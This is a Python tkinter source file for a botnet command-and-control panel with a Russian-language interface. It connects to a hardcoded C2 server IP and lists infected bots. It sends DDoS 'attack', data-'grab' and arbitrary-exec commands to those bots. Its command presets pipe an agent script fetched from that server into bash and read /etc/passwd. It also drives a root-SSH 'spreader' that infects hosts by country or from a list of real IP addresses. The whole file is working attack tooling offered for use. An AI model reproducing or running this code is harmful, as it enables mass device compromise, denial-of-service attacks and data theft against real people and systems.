import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, simpledialog, filedialog
import threading, socket, json, time, subprocess, os, re, requests
from gui.widgets import RightClickMenu

COMMAND_PRESETS = {
    "wget -O- http://80.249.146.202/agent_bash.sh | bash": "Загрузить и запустить агента (wget)",
    "curl -s http://80.249.146.202/agent_bash.sh | bash": "Загрузить и запустить агента (curl)",
    "cat /etc/passwd": "Получить список пользователей",
    "whoami": "Текущий пользователь",
    "uname -a": "Информация о системе",
    "df -h": "Свободное место на дисках"
}

class BotnetTab(ttk.Frame):
    def __init__(self, parent, app=None):
        super().__init__(parent)
        self.app = app
        self.c2_host = "80.249.146.202"
        self.c2_port = 80
        self.vps_pass = None
        self.bots = {}
        self._last_fetch_error = 0
        self.sort_col = None
        self.sort_asc = True
        self.spreader_thread = None
        self.stop_requested = False
        self.create_widgets()
        self.after(5000, self._auto_refresh)

    def create_widgets(self):
        notebook = ttk.Notebook(self)
        notebook.pack(fill=tk.BOTH, expand=True)

        # Вкладка Боты
        bot_frame = ttk.Frame(notebook)
        notebook.add(bot_frame, text="Боты")

        ctrl = ttk.Frame(bot_frame)
        ctrl.pack(fill=tk.X, padx=5, pady=5)
        ttk.Button(ctrl, text="Обновить список", command=self.refresh_bots).pack(side=tk.LEFT, padx=2)
        ttk.Button(ctrl, text="Проверить всех", command=self.check_all_bots).pack(side=tk.LEFT, padx=2)
        ttk.Button(ctrl, text="Атака на выбранных", command=self.launch_attack).pack(side=tk.LEFT, padx=2)
        ttk.Button(ctrl, text="Граб выбранных", command=self.launch_grab).pack(side=tk.LEFT, padx=2)
        ttk.Button(ctrl, text="Стоп выбранных", command=self.stop_selected).pack(side=tk.LEFT, padx=2)
        ttk.Button(ctrl, text="Массовая атака", command=self.mass_attack).pack(side=tk.LEFT, padx=2)
        ttk.Button(ctrl, text="Удалить оффлайн", command=self.delete_offline_bots).pack(side=tk.LEFT, padx=2)
        ttk.Label(ctrl, text="Фильтр:").pack(side=tk.LEFT, padx=(20,5))
        self.filter_var = tk.StringVar(value="Все")
        self.filter_combo = ttk.Combobox(ctrl, textvariable=self.filter_var, values=["Все", "Online", "Offline"], width=10, state='readonly')
        self.filter_combo.pack(side=tk.LEFT)
        self.filter_combo.bind('<<ComboboxSelected>>', lambda e: self.refresh_bots())

        columns = ("ip", "hostname", "os", "type", "country", "cpu", "ram", "status", "speed", "rps", "last_seen")
        tree_frame = ttk.Frame(bot_frame)
        tree_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.tree = ttk.Treeview(tree_frame, columns=columns, show="headings", selectmode="extended")
        for col in columns:
            self.tree.heading(col, text=col.capitalize(), command=lambda c=col: self.sort_by_column(c))
            self.tree.column(col, width=100, anchor="center")
        self.tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar = ttk.Scrollbar(tree_frame, orient="vertical", command=self.tree.yview)
        self.tree.configure(yscrollcommand=scrollbar.set)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

        self.tree.tag_configure('online', foreground='#007700')
        self.tree.tag_configure('offline', foreground='#cc0000')

        self.context_menu = tk.Menu(self.tree, tearoff=0)
        self.context_menu.add_command(label="Атака", command=self._ctx_attack)
        self.context_menu.add_command(label="Граб", command=self._ctx_grab)
        self.context_menu.add_command(label="Стоп", command=self._ctx_stop)
        self.context_menu.add_separator()
        self.context_menu.add_command(label="Выполнить команду...", command=self._ctx_exec)
        self.context_menu.add_command(label="Копировать IP", command=self._ctx_copy_ip)
        self.tree.bind("<Button-3>", self._on_right_click)

        stat = ttk.Frame(bot_frame)
        stat.pack(fill=tk.X, padx=5, pady=5)
        self.lbl_total = ttk.Label(stat, text="Всего: 0")
        self.lbl_total.pack(side=tk.LEFT, padx=10)
        self.lbl_online = ttk.Label(stat, text="Онлайн: 0")
        self.lbl_online.pack(side=tk.LEFT, padx=10)
        self.lbl_power = ttk.Label(stat, text="Суммарная мощность: 0 RPS")
        self.lbl_power.pack(side=tk.LEFT, padx=10)

        # Вкладка Спредер
        spread_frame = ttk.Frame(notebook)
        notebook.add(spread_frame, text="Спредер")
        ttk.Label(spread_frame, text="Управление заражением", font=("Arial", 10, "bold")).pack(pady=5)

        f = ttk.Frame(spread_frame)
        f.pack(pady=5)
        ttk.Label(f, text="Целей за цикл:").pack(side=tk.LEFT)
        self.scale_var = tk.IntVar(value=10000)
        self.spin_count = ttk.Spinbox(f, from_=1000, to=100000, increment=1000, textvariable=self.scale_var, width=8)
        self.spin_count.pack(side=tk.LEFT, padx=5)

        ttk.Label(f, text="Страна:").pack(side=tk.LEFT, padx=(10,0))
        self.country_var = tk.StringVar(value="")
        self.country_combo = ttk.Combobox(f, textvariable=self.country_var, values=["", "RU", "CN", "US", "DE", "GB", "FR", "JP", "IN", "BR"], width=4, state='readonly')
        self.country_combo.pack(side=tk.LEFT, padx=5)

        self.local_var = tk.BooleanVar()
        ttk.Checkbutton(f, text="Локальная сеть", variable=self.local_var, command=self._on_local_changed).pack(side=tk.LEFT, padx=10)
        self.btn_start_vps = ttk.Button(f, text="Запустить на VPS", command=self.start_spreader_vps)
        self.btn_start_vps.pack(side=tk.LEFT, padx=10)
        self.btn_stop_vps = ttk.Button(f, text="Стоп", command=self.stop_spreader_vps, state=tk.DISABLED)
        self.btn_stop_vps.pack(side=tk.LEFT, padx=10)
        self.btn_check_c2 = ttk.Button(f, text="Проверить C2", command=self.check_c2_connection)
        self.btn_check_c2.pack(side=tk.LEFT, padx=10)
        self.btn_update_vps = ttk.Button(f, text="Обновить VPS", command=self.update_vps)
        self.btn_update_vps.pack(side=tk.LEFT, padx=10)
        self.btn_load_targets = ttk.Button(f, text="Загрузить цели", command=self.load_targets_file)
        self.btn_load_targets.pack(side=tk.LEFT, padx=10)
        self.btn_masscan = ttk.Button(f, text="Masscan (встр.)", command=self.start_builtin_masscan)
        self.btn_masscan.pack(side=tk.LEFT, padx=10)

        self.spread_progress_var = tk.DoubleVar()
        self.spread_progress = ttk.Progressbar(spread_frame, variable=self.spread_progress_var, maximum=100, mode='determinate')
        self.spread_progress.pack(fill=tk.X, padx=5, pady=2)
        self.lbl_spread_status = ttk.Label(spread_frame, text="Готов")
        self.lbl_spread_status.pack(anchor='w', padx=5)

        self.spread_log = scrolledtext.ScrolledText(spread_frame, height=12, bg='black', fg='#00ff41')
        self.spread_log.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        RightClickMenu(self.spread_log,
                       get_text_func=lambda: self.spread_log.selection_get() if self.spread_log.tag_ranges(tk.SEL) else self.spread_log.get("1.0", tk.END).strip())

        cmd_frame = ttk.LabelFrame(self, text="Пользовательская команда")
        cmd_frame.pack(fill=tk.X, padx=5, pady=5)
        ttk.Label(cmd_frame, text="Выберите команду или введите свою:").grid(row=0, column=0, sticky='w', padx=5, pady=2)

        self.cmd_var = tk.StringVar()
        self.cmd_combo = ttk.Combobox(cmd_frame, textvariable=self.cmd_var,
                                      values=list(COMMAND_PRESETS.keys()), width=50, state='readonly')
        self.cmd_combo.grid(row=1, column=0, padx=5, pady=2, sticky='ew')
        self.cmd_combo.bind('<<ComboboxSelected>>', self._on_cmd_select)

        self.cmd_desc_label = ttk.Label(cmd_frame, text="", foreground="#555555")
        self.cmd_desc_label.grid(row=2, column=0, padx=5, sticky='w')

        self.cmd_entry = ttk.Entry(cmd_frame, width=50)
        self.cmd_entry.grid(row=3, column=0, padx=5, pady=2, sticky='ew')

        ttk.Button(cmd_frame, text="Отправить", command=self.send_custom_command).grid(row=1, column=1, padx=5)
        cmd_frame.columnconfigure(0, weight=1)

        if COMMAND_PRESETS:
            first_cmd = list(COMMAND_PRESETS.keys())[0]
            self.cmd_combo.set(first_cmd)
            self.cmd_desc_label.config(text=COMMAND_PRESETS[first_cmd])

    # ----- Контекстное меню -----
    def _on_right_click(self, event):
        row = self.tree.identify_row(event.y)
        if row:
            self.tree.selection_set(row)
            self.context_menu.post(event.x_root, event.y_root)

    def _ctx_attack(self): self.launch_attack()
    def _ctx_grab(self): self.launch_grab()
    def _ctx_stop(self): self.stop_selected()
    def _ctx_exec(self):
        selected = self.tree.selection()
        if not selected: return
        cmd = simpledialog.askstring("Команда", "Введите команду:")
        if cmd: self._send_custom_to_bots(cmd)
    def _ctx_copy_ip(self):
        selected = self.tree.selection()
        if selected:
            ip = self.tree.item(selected[0], 'values')[0]
            self.clipboard_clear()
            self.clipboard_append(ip)
            messagebox.showinfo("Скопировано", f"IP {ip} скопирован")

    def _on_cmd_select(self, event=None):
        selected = self.cmd_combo.get()
        if selected in COMMAND_PRESETS:
            self.cmd_desc_label.config(text=COMMAND_PRESETS[selected])
            self.cmd_entry.delete(0, tk.END)
            self.cmd_entry.insert(0, selected)

    # ----- Проверка C2 -----
    def check_c2_connection(self):
        def check():
            self.spread_log.insert(tk.END, "[*] Checking C2 connection...\n")
            try:
                s = socket.socket()
                s.settimeout(5)
                start = time.time()
                s.connect((self.c2_host, self.c2_port))
                s.sendall(b"list")
                data = s.recv(1024)
                elapsed = time.time() - start
                s.close()
                self.spread_log.insert(tk.END, f"[+] C2 online, response {len(data)} bytes in {elapsed:.2f}s\n")
            except Exception as e:
                self.spread_log.insert(tk.END, f"[!] C2 error: {e}\n")
        threading.Thread(target=check, daemon=True).start()

    # ----- Обновление списка ботов -----
    def _auto_refresh(self):
        self.refresh_bots()
        self.after(5000, self._auto_refresh)

    def refresh_bots(self):
        threading.Thread(target=self._fetch_bots, daemon=True).start()

    def check_all_bots(self):
        self.refresh_bots()
        messagebox.showinfo("Проверка", "Запрос отправлен. Статусы обновятся через несколько секунд.")

    def _fetch_bots(self):
        for attempt in range(3):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(15)
                sock.connect((self.c2_host, self.c2_port))
                sock.sendall(b"list\n")
                data = b""
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    data += chunk
                sock.close()
                if not data:
                    raise Exception("empty response")
                bots = json.loads(data)
                self.after(0, self._update_tree_safe, bots)
                return
            except Exception as e:
                if attempt == 2:
                    now = time.time()
                    if now - self._last_fetch_error > 10:
                        self.spread_log.insert(tk.END, f"[!] Bot list update error: {e}\n")
                        self._last_fetch_error = now
                time.sleep(2)

    def sort_by_column(self, col):
        if self.sort_col == col:
            self.sort_asc = not self.sort_asc
        else:
            self.sort_col = col
            self.sort_asc = True
        self.refresh_bots()

    def _update_tree_safe(self, bots):
        selected_ips = [self.tree.item(i, 'values')[0] for i in self.tree.selection()]
        self.bots = {bot["ip"]: bot for bot in bots if bot.get("ip")}
        filter_val = self.filter_var.get()
        if filter_val == "Online":
            bots = [b for b in bots if b.get("status") == "online"]
        elif filter_val == "Offline":
            bots = [b for b in bots if b.get("status") != "online"]
        if self.sort_col:
            idx = ("ip", "hostname", "os", "type", "country", "cpu", "ram", "status", "speed", "rps", "last_seen").index(self.sort_col)
            bots = sorted(bots, key=lambda x: x.get(self.sort_col, ""), reverse=not self.sort_asc)
        for item in self.tree.get_children():
            self.tree.delete(item)
        total = len(bots)
        online = 0
        total_rps = 0
        for bot in bots:
            ip = bot.get("ip")
            status = bot.get("status", "offline")
            tag = 'online' if status == 'online' else 'offline'
            device_type = bot.get("type", "")
            if not device_type:
                os_info = bot.get("os", "").lower()
                hostname = bot.get("hostname", "").lower()
                if "windows" in os_info:
                    device_type = "Windows ПК"
                elif "linux" in os_info and ("server" in hostname or "srv" in hostname or "vps" in hostname):
                    device_type = "Сервер"
                elif "linux" in os_info:
                    device_type = "Linux"
                elif "router" in os_info or "dd-wrt" in os_info:
                    device_type = "Роутер"
                elif "android" in os_info:
                    device_type = "Android"
                elif "ios" in os_info:
                    device_type = "iPhone/iPad"
                else:
                    device_type = "Неизвестно"
            country = bot.get("country", "")
            speed = bot.get("speed_mbps", 0)
            values = (ip, bot.get("hostname",""), bot.get("os",""), device_type, country,
                      bot.get("cpu",""), bot.get("ram",""), status,
                      f"{speed} Mbps" if speed else "N/A",
                      bot.get("rps",0), bot.get("last_seen",""))
            self.tree.insert("", "end", values=values, tags=(tag,))
            if status == 'online': online += 1
            total_rps += int(bot.get("rps",0))
        for item in self.tree.get_children():
            if self.tree.item(item, 'values')[0] in selected_ips:
                self.tree.selection_add(item)
        self.lbl_total.config(text=f"Всего: {total}")
        self.lbl_online.config(text=f"Онлайн: {online}")
        self.lbl_power.config(text=f"Суммарная мощность: {total_rps} RPS")

    def _send_raw(self, msg):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.c2_host, self.c2_port))
            sock.sendall(msg.encode())
            resp = sock.recv(1024)
            sock.close()
            return resp
        except Exception as e:
            messagebox.showerror("Ошибка", str(e))
            return None

    def launch_attack(self):
        selected = self.tree.selection()
        if not selected:
            messagebox.showwarning("Ошибка", "Выберите ботов")
            return
        target = simpledialog.askstring("Цель", "URL/IP цели:")
        if not target: return
        method = simpledialog.askstring("Метод", "Метод атаки (GET, POST, CFB, ...):", initialvalue="GET")
        if not method: return
        threads = simpledialog.askinteger("Потоки", "Количество потоков:", initialvalue=100)
        if threads is None: return
        bot_ips = [self.tree.item(i, "values")[0] for i in selected]
        self._send_raw(f"attack:{target}|{method}|{threads}|{','.join(bot_ips)}")
        messagebox.showinfo("Атака", f"Команда отправлена на {len(bot_ips)} ботов")

    def launch_grab(self):
        selected = self.tree.selection()
        if not selected: return
        bot_ips = [self.tree.item(i, "values")[0] for i in selected]
        self._send_raw(f"grab:{','.join(bot_ips)}")
        messagebox.showinfo("Граб", "Команда захвата данных отправлена")

    def stop_selected(self):
        selected = self.tree.selection()
        if not selected: return
        bot_ips = [self.tree.item(i, "values")[0] for i in selected]
        self._send_raw(f"stop:{','.join(bot_ips)}")
        messagebox.showinfo("Стоп", "Команда остановки атаки отправлена")

    def _send_custom_to_bots(self, cmd):
        selected = self.tree.selection()
        if not selected:
            messagebox.showwarning("Ошибка", "Выберите ботов")
            return
        ips = [self.tree.item(i, "values")[0] for i in selected]
        for ip in ips:
            self._send_raw(f"exec:{ip}:{cmd}")
        messagebox.showinfo("Команда", f"Команда '{cmd}' отправлена на {len(ips)} ботов")

    def send_custom_command(self):
        cmd = self.cmd_entry.get().strip()
        if not cmd:
            messagebox.showwarning("Ошибка", "Введите или выберите команду")
            return
        self._send_custom_to_bots(cmd)

    # ----- Массовая атака -----
    def mass_attack(self):
        target = simpledialog.askstring("Цель", "URL/IP цели для массовой атаки:")
        if not target: return
        method = simpledialog.askstring("Метод", "Метод атаки (GET, POST, CFB, ...):", initialvalue="GET")
        if not method: return
        threads = simpledialog.askinteger("Потоки на бота", "Количество потоков на одного бота:", initialvalue=100)
        if threads is None: return
        online_bots = [ip for ip, bot in self.bots.items() if bot.get("status") == "online"]
        if not online_bots:
            messagebox.showwarning("Ошибка", "Нет онлайн ботов")
            return
        self._send_raw(f"attack:{target}|{method}|{threads}|{','.join(online_bots)}")
        messagebox.showinfo("Массовая атака", f"Команда отправлена на {len(online_bots)} ботов")

    # ----- Удаление оффлайн ботов -----
    def delete_offline_bots(self):
        if not messagebox.askyesno("Удаление", "Удалить всех оффлайн-ботов?"):
            return
        offline_ips = [ip for ip, bot in self.bots.items() if bot.get("status") != "online"]
        for ip in offline_ips:
            self._send_raw(f"delete:{ip}")
        self.refresh_bots()

    # ----- Спредер на VPS -----
    def _on_local_changed(self):
        pass

    def _run_spreader_stream(self):
        self.stop_requested = False
        self.btn_start_vps.config(state=tk.DISABLED)
        self.btn_stop_vps.config(state=tk.NORMAL)
        self.spread_log.insert(tk.END, "[*] Запуск спредера...\n")
        self.lbl_spread_status.config(text="Подключение к VPS...")
        try:
            import paramiko
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(self.c2_host, username="root", password=self.vps_pass, timeout=10)

            client.exec_command("pkill -9 -f 'spreader.py'")
            time.sleep(1)
            client.exec_command("> /root/c2/spreader.log")
            count = self.scale_var.get()
            country = self.country_var.get()
            cmd = f"cd /root/c2 && nohup python3 -u botnet/spreader.py --count {count} >> spreader.log 2>&1 &"
            if country:
                cmd = f"export SPREAD_COUNTRY={country}; {cmd}"
            client.exec_command(cmd)

            stdin, stdout, stderr = client.exec_command("tail -f /root/c2/spreader.log")
            self.lbl_spread_status.config(text="Сканирование...")
            self.spread_progress.config(mode='indeterminate')
            self.spread_progress.start()

            for line in iter(stdout.readline, ""):
                if self.stop_requested:
                    client.exec_command("pkill -9 -f 'spreader.py'")
                    break
                self.spread_log.insert(tk.END, line)
                self.spread_log.see(tk.END)
                match = re.search(r'\[PROGRESS\]\s+(\d+)/(\d+)', line)
                if match:
                    current = int(match.group(1))
                    total = int(match.group(2))
                    progress = (current / total) * 100
                    self.spread_progress.config(mode='determinate')
                    self.spread_progress_var.set(progress)
                    self.lbl_spread_status.config(text=f"Сканирование: {current}/{total}")
            client.close()
        except Exception as e:
            self.spread_log.insert(tk.END, f"[!] Ошибка: {e}\n")
        finally:
            self.spread_progress.stop()
            self.btn_start_vps.config(state=tk.NORMAL)
            self.btn_stop_vps.config(state=tk.DISABLED)
            self.lbl_spread_status.config(text="Остановлено" if self.stop_requested else "Готов")

    def start_spreader_vps(self):
        if not self.vps_pass:
            self.vps_pass = simpledialog.askstring("VPS пароль", f"Введите пароль для root@{self.c2_host}:", show='*')
            if not self.vps_pass:
                return
        self.spreader_thread = threading.Thread(target=self._run_spreader_stream, daemon=True)
        self.spreader_thread.start()

    def stop_spreader_vps(self):
        self.stop_requested = True
        self.btn_stop_vps.config(state=tk.DISABLED)
        self.lbl_spread_status.config(text="Остановка...")

    # ----- Загрузка файла целей -----
    def load_targets_file(self):
        path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if path:
            if not self.vps_pass:
                self.vps_pass = simpledialog.askstring("VPS пароль", "Введите пароль для root@80.249.146.202:", show='*')
                if not self.vps_pass:
                    return
            def run():
                try:
                    import paramiko
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(self.c2_host, username="root", password=self.vps_pass, timeout=5)
                    sftp = client.open_sftp()
                    sftp.put(path, "/root/c2/targets.txt")
                    sftp.close()
                    self.spread_log.insert(tk.END, f"[*] Файл загружен на VPS. Запуск спредера по списку...\n")
                    cmd = "cd /root/c2 && screen -dmS spreader python3 -u botnet/spreader.py --targets /root/c2/targets.txt"
                    client.exec_command(cmd)
                    client.close()
                except Exception as e:
                    self.spread_log.insert(tk.END, f"[!] Ошибка загрузки: {e}\n")
            threading.Thread(target=run, daemon=True).start()

    # ----- Встроенный Masscan -----
    def start_builtin_masscan(self):
        if not self.vps_pass:
            self.vps_pass = simpledialog.askstring("VPS пароль", f"Введите пароль для root@{self.c2_host}:", show='*')
            if not self.vps_pass:
                return
        def run():
            try:
                import paramiko
                self.spread_log.insert(tk.END, "[*] Запуск встроенного масс‑сканера...\n")
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(self.c2_host, username="root", password=self.vps_pass, timeout=5)
                cmd = ("cd /root/c2 && "
                       "python3 -c \"import json; ips = ['45.33.32.156','34.94.3.0','45.77.165.0','185.220.101.0','23.226.229.0','103.15.28.0','185.225.19.0','45.33.32.0','45.56.89.0','45.79.207.0','34.94.0.0','34.94.1.0','45.33.32.1','34.94.2.0','45.77.165.1','103.235.46.39','103.235.46.40','103.235.46.41','103.235.46.42','103.235.46.43','103.235.46.44','103.235.46.45','103.235.46.46','103.235.46.47','103.235.46.48','103.235.46.49','103.235.46.50']; open('masscan.json','w').write(json.dumps(ips))\" && "
                       "screen -dmS mass_spreader python3 -u botnet/spreader.py --targets masscan.json 2>&1")
                stdin, stdout, stderr = client.exec_command(cmd)
                time.sleep(2)
                check = "screen -ls | grep mass_spreader"
                stdin, stdout, stderr = client.exec_command(check)
                if "mass_spreader" in stdout.read().decode():
                    self.spread_log.insert(tk.END, "[+] Спредер запущен в screen mass_spreader\n")
                else:
                    self.spread_log.insert(tk.END, "[!] Не удалось запустить screen, пробуем напрямую...\n")
                    cmd2 = ("cd /root/c2 && python3 -u botnet/spreader.py --targets masscan.json")
                    stdin, stdout, stderr = client.exec_command(cmd2)
                    for line in iter(stdout.readline, ""):
                        self.spread_log.insert(tk.END, line)
                        self.spread_log.see(tk.END)
                client.close()
            except Exception as e:
                self.spread_log.insert(tk.END, f"[!] Ошибка: {e}\n")
        threading.Thread(target=run, daemon=True).start()

    # ----- Обновление VPS (только C2, спредер не запускаем) -----
    def update_vps(self):
        if not self.vps_pass:
            self.vps_pass = simpledialog.askstring("VPS пароль", f"Введите пароль для root@{self.c2_host}:", show='*')
            if not self.vps_pass:
                return
        def run():
            try:
                import paramiko
                self.spread_log.insert(tk.END, "[*] Обновление VPS через GitHub...\n")
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(self.c2_host, username="root", password=self.vps_pass, timeout=10)

                stop_cmd = "systemctl stop avz-c2; pkill -9 -f botnet/c2.py"
                client.exec_command(stop_cmd)

                update_cmd = "cd /root/c2 && git fetch origin main && git reset --hard origin/main"
                stdin, stdout, stderr = client.exec_command(update_cmd)
                out = stdout.read().decode()
                err = stderr.read().decode()
                self.spread_log.insert(tk.END, out + "\n" + err + "\n")

                start_c2 = "cd /root/c2 && nohup python3 botnet/c2.py > c2.log 2>&1 &"
                client.exec_command(start_c2)

                time.sleep(3)
                check_cmd = "ss -tlnp | grep 80"
                stdin, stdout, stderr = client.exec_command(check_cmd)
                port_info = stdout.read().decode()
                self.spread_log.insert(tk.END, f"Ports:\n{port_info}")
                if "80" in port_info:
                    self.spread_log.insert(tk.END, "[+] C2 запущен успешно. Спредер запускайте кнопкой 'Запустить на VPS'.\n")
                client.close()
            except Exception as e:
                self.spread_log.insert(tk.END, f"[!] Ошибка обновления VPS: {e}\n")
        threading.Thread(target=run, daemon=True).start()
